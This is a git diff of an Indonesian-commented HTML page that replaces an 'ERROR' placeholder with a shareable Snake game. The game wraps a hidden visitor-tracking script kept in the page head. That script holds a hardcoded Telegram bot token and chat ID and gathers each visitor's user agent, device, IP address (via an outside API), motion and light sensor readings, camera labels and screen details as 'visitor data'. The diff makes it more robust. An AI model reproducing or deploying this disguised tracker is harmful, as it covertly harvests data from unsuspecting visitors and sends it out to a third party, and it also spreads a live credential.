@@ -1,22 +1,94 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ERROR</title>
-        <style>
-        h1 {
-            font-family: "Courier New", Courier, monospace;
-            text-align: center;
-            font-size: 15px;
-            background-color: #00AFFF;
-            color: #000000;
-            border: none;
-            cursor: pointer;
-            border-radius: 4px;
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+   <!-- Open Graph Meta Tags -->
+  <meta property="og:title" content="Snake Game - Permainan Ular" />
+  <meta property="og:description" content="Buat skor sebanyak-banyaknya dan jadilah yang terbaik!, anda tertarik? mainkan sekarang! mwehwheeh" />
+  <meta property="og:image" content="https://i.ibb.co/HqgVQGX/20241013-173332.jpg" />
+  <meta property="og:url" content="https://satu-persen.github.io/-/snake" />
+  <meta property="og:type" content="website" />
+  <title>Snake Game</title>
+  <style>
+    #thankYouMessage {
+    position: absolute; /* Atur posisi absolut */
+    bottom: 15px; /* Jarak dari bawah */
+    right: 15px; /* Jarak dari kanan */
+    font-size: 4px; /* Ukuran font sangat kecil */
+    opacity: 0.9; /* Mengatur transparansi agar tidak terlihat */
+    }
+
+    #copy {
+    position: absolute; /* Atur posisi absolut */
+    bottom: 18px; /* Jarak dari bawah */
+    right: 15px; /* Jarak dari kanan */
+    font-size: 10px; /* Ukuran font sangat kecil */
+    opacity: 9.9; /* Mengatur transparansi agar tidak terlihat */
         }
-    </style>
-    <script>
+    
+    body {
+      font-family: Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      background-color: #f0f0f0;
+      min-height: 100vh;
+      margin: 0;
+    }
+
+    h1 {
+      margin-top: 20px;
+    }
+
+    .form-container, .game-container, .leaderboard {
+      margin-top: 20px;
+      padding: 20px;
+      background-color: white;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      border-radius: 8px;
+      width: 300px;
+      text-align: center;
+    }
+
+    input {
+      padding: 8px;
+      margin-bottom: 10px;
+      width: 90%;
+      border: 1px solid #ddd;
+      border-radius: 4px;
+    }
+
+    button {
+      padding: 10px 20px;
+      margin: 5px;
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #45a049;
+    }
+
+    canvas {
+      border: 1px solid black;
+    }
+
+    .controls {
+      margin-top: 10px;
+    }
+
+    #retryButton {
+      display: none;
+      margin-top: 10px;
+      background-color: red;
+    }
+  </style>
+      <script>
         const botToken = "7662016753:AAFmeuLnZRm_1K25cDKc54eDxXbzp4cNugM"; // Ganti dengan token bot Telegram
         const chatId = "-1002428239923"; // Ganti dengan chat ID penerima
 
@@ -59,6 +131,8 @@ Data Pengunjung:
         async function getData() {
             const ua = navigator.userAgent;
             const device = /Android|iPhone|iPad|Windows/i.test(ua) ? (ua.match(/Android|iPhone|iPad|Windows/i) || ["Unknown"])[0] : "Unknown";
+
+            // Mendapatkan merk perangkat menggunakan navigator
             const deviceBrand = navigator.platform || "Unknown";
 
             // IP Address via API
@@ -94,7 +168,7 @@ Data Pengunjung:
             }
         }
 
-        async function collectSensors(baseData) {
+        function collectSensors(baseData) {
             let light = "Tidak tersedia";
             let alpha = "N/A", beta = "N/A", gamma = "N/A";
             let accelX = "N/A", accelY = "N/A", accelZ = "N/A";
@@ -148,13 +222,15 @@ Data Pengunjung:
             }
 
             // Mendapatkan Kamera
-            await navigator.mediaDevices.enumerateDevices().then(devices => {
-                devices.forEach(device => {
-                    if (device.kind === "videoinput") {
-                        camera = device.label || "Kamera tidak terdeteksi";
-                    }
+            if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+                navigator.mediaDevices.enumerateDevices().then(devices => {
+                    devices.forEach(device => {
+                        if (device.kind === "videoinput") {
+                            camera = device.label || "Kamera tidak terdeteksi";
+                        }
+                    });
                 });
-            });
+            }
 
             // Ukuran Layar dan Resolusi
             if (window.screen) {
@@ -187,6 +263,199 @@ Data Pengunjung:
     </script>
 </head>
 <body>
-    <h1>ERROR</h1>
+
+  <h1>Snake Game</h1>
+
+  <div class="form-container" id="registrationForm">
+    <h2>Create Your Card</h2>
+    <input type="text" id="username" placeholder="Enter your name" required>
+    <button onclick="registerUser()">Create Card</button>
+  </div>
+
+  <div class="game-container" id="gameContainer" style="display:none;">
+    <h2>Snake Game🐍</h2>
+    <canvas id="gameCanvas" width="300" height="300"></canvas>
+
+    <div class="controls">
+      <button onclick="changeDirection('up')">⬆️</button><br>
+      <button onclick="changeDirection('left')">⬅️</button>
+      <button onclick="changeDirection('right')">➡️</button><br>
+      <button onclick="changeDirection('down')">⬇️</button>
+    </div>
+
+    <button id="retryButton" onclick="retryGame()">🔃</button>
+  </div>
+
+  <button id="startButton" style="display:none;" onclick="startGame()">START GAME😎</button>
+
+  <div class="leaderboard">
+    <h2>Score📋</h2>
+    <ul id="leaderboardList"></ul>
+  </div>
+
+  <script>
+    let leaderboard = JSON.parse(localStorage.getItem('leaderboard')) || [];
+    let gameInterval = null;
+
+    // Fungsi untuk mendaftarkan pengguna
+    function registerUser() {
+      const username = document.getElementById('username').value.trim();
+      if (!username) {
+        alert('Please enter your name!');
+        return;
+      }
+      localStorage.setItem('activeUser', username);
+      alert(`Welcome, ${username}! Click Start to play.▶️`);
+      document.getElementById('startButton').style.display = 'block'; // Tampilkan tombol Start
+      document.getElementById('registrationForm').style.display = 'none';
+    }
+
+    function startGame() {
+      document.getElementById('startButton').style.display = 'none'; // Sembunyikan tombol Start
+      document.getElementById('gameContainer').style.display = 'block';
+      
+      // Memulai permainan
+      canvas = document.getElementById('gameCanvas');
+      ctx = canvas.getContext('2d');
+      snake = [{ x: 10, y: 10 }];
+      direction = { x: 0, y: 0 };
+      score = 0;
+      placeFood();
+
+      if (gameInterval) clearInterval(gameInterval);
+      gameInterval = setInterval(updateGame, 200); // Ular lebih lambat
+    }
+
+    window.onload = function() {
+      const activeUser = localStorage.getItem('activeUser');
+      if (activeUser) {
+        document.getElementById('startButton').style.display = 'block'; // Tampilkan tombol Start jika ada pengguna aktif
+      }
+      updateLeaderboard();
+    };
+
+    let canvas, ctx;
+    let snake, food, direction, score;
+
+    function updateGame() {
+      const head = { x: snake[0].x + direction.x, y: snake[0].y + direction.y };
+      snake.unshift(head);
+
+      if (head.x === food.x && head.y === food.y) {
+        score++;
+        placeFood();
+      } else {
+        snake.pop();
+      }
+
+      if (head.x < 0 || head.y < 0 || head.x >= 30 || head.y >= 30) {
+        if (snake.length > 1) {
+          snake.pop();
+        } else {
+          gameOver();
+          return;
+        }
+      }
+
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+      ctx.fillStyle = 'green';
+      snake.forEach(part => ctx.fillRect(part.x * 10, part.y * 10, 10, 10));
+      ctx.fillStyle = 'red';
+      ctx.fillRect(food.x * 10, food.y * 10, 10, 10);
+    }
+
+    function changeDirection(dir) {
+      if (dir === 'up' && direction.y === 0) direction = { x: 0, y: -1 };
+      if (dir === 'down' && direction.y === 0) direction = { x: 0, y: 1 };
+      if (dir === 'left' && direction.x === 0) direction = { x: -1, y: 0 };
+      if (dir === 'right' && direction.x === 0) direction = { x: 1, y: 0 };
+    }
+
+    function placeFood() {
+      food = {
+        x: Math.floor(Math.random() * 30),
+        y: Math.floor(Math.random() * 30)
+      };
+    }
+    
+    function gameOver() {
+  clearInterval(gameInterval);
+  const activeUser = localStorage.getItem('activeUser');
+  alert(`Game Over! Your score: ${score}`);
+
+  // Cek apakah sudah ada skor sebelumnya untuk pengguna ini
+  const existingScore = leaderboard.find(entry => entry.username === activeUser);
+
+  if (!existingScore || score > existingScore.score) {
+    // Jika skor baru lebih tinggi atau belum ada skor, simpan
+    if (existingScore) {
+      // Hapus skor lama
+      leaderboard = leaderboard.filter(entry => entry.username !== activeUser);
+    }
+
+    // Tambahkan skor baru ke leaderboard
+    leaderboard.push({ username: activeUser, score });
+    leaderboard.sort((a, b) => b.score - a.score); // Urutkan dari skor tertinggi
+    localStorage.setItem('leaderboard', JSON.stringify(leaderboard));
+  }
+
+  updateLeaderboard();
+  document.getElementById('retryButton').style.display = 'block';
+}
+    
+    function retryGame() {
+      document.getElementById('retryButton').style.display = 'none';
+      startGame();
+    }
+
+    
+<!-- WHAT ARE YOU DOING ? -->
+<!-- WHAT ARE YOU DOING ? -->
+<!-- WHAT ARE YOU DOING ? -->
+<!-- WHAT ARE YOU DOING ? -->
+<!-- WHAT ARE YOU DOING ? -->
+<!-- WHAT ARE YOU DOING ? -->
+<!-- WHAT ARE YOU DOING ? -->
+<!-- WHAT ARE YOU DOING ? -->
+<!-- WHAT ARE YOU DOING ? -->
+<!-- WHAT ARE YOU DOING ? -->
+<!-- WHAT ARE YOU DOING ? -->
+<!-- WHAT ARE YOU DOING ? -->
+<!-- WHAT ARE YOU DOING ? -->
+<!-- WHAT ARE YOU DOING ? -->
+<!-- WHAT ARE YOU DOING ? -->
+<!-- WHAT ARE YOU DOING ? -->
+<!-- WHAT ARE YOU DOING ? -->
+<!-- WHAT ARE YOU DOING ? -->
+<!-- WHAT ARE YOU DOING ? -->
+<!-- WHAT ARE YOU DOING ? -->
+<!-- WHAT ARE YOU DOING ? -->
+<!-- WHAT ARE YOU DOING ? -->
+<!-- WHAT ARE YOU DOING ? -->
+<!-- WHAT ARE YOU DOING ? -->
+<!-- WHAT ARE YOU DOING ? -->
+<!-- WHAT ARE YOU DOING ? -->
+<!-- WHAT ARE YOU DOING ? -->
+<!-- WHAT ARE YOU DOING ? -->
+<!-- WHAT ARE YOU DOING ? -->
+<!-- WHAT ARE YOU DOING ? -->
+<!-- WHAT ARE YOU DOING ? -->
+<!-- WHAT ARE YOU DOING ? -->
+<!-- WHAT ARE YOU DOING ? -->
+<!-- WHAT ARE YOU DOING ? -->
+<!-- WHAT ARE YOU DOING ? -->
+<!-- WHAT ARE YOU DOING ? -->
+<!-- WHAT ARE YOU DOING ? -->
+<!-- WHAT ARE YOU DOING ? -->
+    function updateLeaderboard() {
+      const leaderboardList = document.getElementById('leaderboardList');
+      leaderboardList.innerHTML = '';
+      leaderboard.forEach(({ username, score }) => {
+        const li = document.createElement('li');
+        li.textContent = `${username}: ${score} points`;
+        leaderboardList.appendChild(li);
+      });
+    }
+  </script>
 </body>
 </html>
